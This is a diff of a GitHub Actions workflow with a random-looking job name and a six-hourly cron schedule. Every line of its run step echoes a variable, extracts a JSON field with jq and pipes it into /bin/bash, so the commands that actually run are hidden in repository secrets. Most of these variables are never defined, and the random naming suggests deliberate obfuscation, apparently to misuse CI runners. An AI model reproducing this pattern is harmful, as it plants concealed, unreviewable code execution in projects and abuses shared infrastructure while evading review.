@@ -2,7 +2,8 @@ name: meiwucan8563
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
+    - cron: '14 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,21 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: meiwucan8563
         env:
-          jemg6076: ${{ secrets.jemg6076 }}
+          l6: ${{ secrets.l6 }}
         run: |
-          echo $jemg6076 | jq -r .e96853 | /bin/bash
-          echo $hyld9 | jq -r .eg76 | /bin/bash
-          echo $g64899 | jq -r .uznh10 | /bin/bash
-          echo $t54 | jq -r .c243 | /bin/bash
-          echo $m3 | jq -r .nrh4 | /bin/bash
-          echo $olzm503 | jq -r .gbj436 | /bin/bash
-          echo $xzi31939 | jq -r .pkfjc344 | /bin/bash
-          echo $u7 | jq -r .jazdk5940 | /bin/bash
-          echo $bq985 | jq -r .ruz9 | /bin/bash
-          echo $efsg830 | jq -r .jzqi66 | /bin/bash
-          echo $ps80 | jq -r .c31036 | /bin/bash
-          echo $oyg2 | jq -r .yla67 | /bin/bash
-          echo $e079 | jq -r .ofj6012 | /bin/bash
-          echo $dlqvg67214 | jq -r .uowka3 | /bin/bash
-          echo $lzj08862 | jq -r .rrxgl038 | /bin/bash
+          echo $l6 | jq -r .j46132 | /bin/bash
+          echo $tpsbn6 | jq -r .pkuaa1 | /bin/bash
+          echo $fq079 | jq -r .k2 | /bin/bash
+          echo $pyiu87 | jq -r .ccvbw320 | /bin/bash
+          echo $kd0 | jq -r .xmxwr018 | /bin/bash
+          echo $bl30638 | jq -r .xoaq6909 | /bin/bash
+          echo $q14526 | jq -r .lwc99 | /bin/bash
+          echo $q370 | jq -r .ez1723 | /bin/bash
+          echo $vt3 | jq -r .wcegu03 | /bin/bash
 
